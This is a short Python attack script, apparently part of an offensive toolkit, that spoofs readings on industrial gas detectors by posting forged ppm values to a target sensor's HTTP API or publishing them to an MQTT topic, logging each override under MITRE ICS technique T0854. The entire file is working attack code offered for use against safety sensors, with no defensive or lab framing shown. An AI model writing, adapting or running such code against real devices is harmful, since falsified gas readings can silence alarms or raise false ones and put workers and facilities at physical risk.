#!/usr/bin/env python3
# modules/attacks/gas_detector_overrider.py

import argparse
import requests
import json
import os
from datetime import datetime

LOG_FILE = "results/gas_detector_override.json"
MITRE_TTP = "T0854"

def log_override(ip, method, value):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "method": method,
            "spoofed_gas_ppm": value,
            "ttp": MITRE_TTP
        }) + "\n")

def override_http(ip, value):
    try:
        url = f"http://{ip}/api/gas_reading"
        r = requests.post(url, json={"ppm": value}, timeout=3)
        log_override(ip, "HTTP", value)
        print(f"[✓] HTTP override sent to {ip}: {value} ppm")
    except Exception as e:
        print(f"[!] HTTP override failed: {e}")

def override_mqtt(ip, value):
    try:
        import paho.mqtt.publish as publish
        topic = "sensors/gas"
        msg = json.dumps({"ppm": value})
        publish.single(topic, msg, hostname=ip)
        log_override(ip, "MQTT", value)
        print(f"[✓] MQTT gas spoof sent to {ip}")
    except Exception as e:
        print(f"[!] MQTT spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override gas detector data or alerts")
    parser.add_argument("--ip", required=True, help="Target sensor IP")
    parser.add_argument("--value", type=float, required=True, help="Spoofed gas value in ppm")
    parser.add_argument("--method", choices=["http", "mqtt"], required=True, help="Override method")
    args = parser.parse_args()

    if args.method == "http":
        override_http(args.ip, args.value)
    else:
        override_mqtt(args.ip, args.value)
